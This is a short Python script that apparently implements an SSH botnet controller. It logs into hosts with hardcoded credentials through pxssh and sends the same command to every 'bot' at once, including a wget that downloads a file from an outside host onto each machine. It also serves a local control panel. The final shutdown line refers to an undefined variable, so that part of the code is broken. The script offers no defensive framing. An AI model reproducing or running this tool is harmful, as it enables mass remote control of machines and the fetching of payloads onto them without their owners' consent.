import http.server
import webbrowser
import threading
from pexpect import pxssh

class Bot:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.ssh()

    def ssh(self):
        try:
            bot = pxssh.pxssh()
            bot.login(self.host, self.user, self.password)
            return bot
        except pxssh.ExceptionPxssh as e:
            print('Connection failure.')
            print(e)

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before.decode()

    def disconnect(self):
        self.session.logout()

botnet = []

def add_bot(host, user, password):
    new_bot = Bot(host, user, password)
    botnet.append(new_bot)

def disconnect_bots():
    for bot in botnet:
        bot.disconnect()

def command_bots(command):
    for bot in botnet:
        attack = bot.send_command(command)
        print('Output from ' + bot.host)
        print(attack)

def start_server():
    server_address = ('', 8000)
    httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
    httpd.serve_forever()

# Chamada para abrir o painel
def open_panel():
    webbrowser.open_new_tab('http://localhost:8000/web/index.html')

add_bot('10.0.0.59', 'username1', 'password1')
add_bot('10.0.0.60', 'username2', 'password2')

server_thread = threading.Thread(target=start_server)
server_thread.start()

open_panel()

command_bots('ls')

command_bots('wget -O /path/to/save/file.txt "http://example.com/file.txt"')

disconnect_bots()

httpd.shutdown()
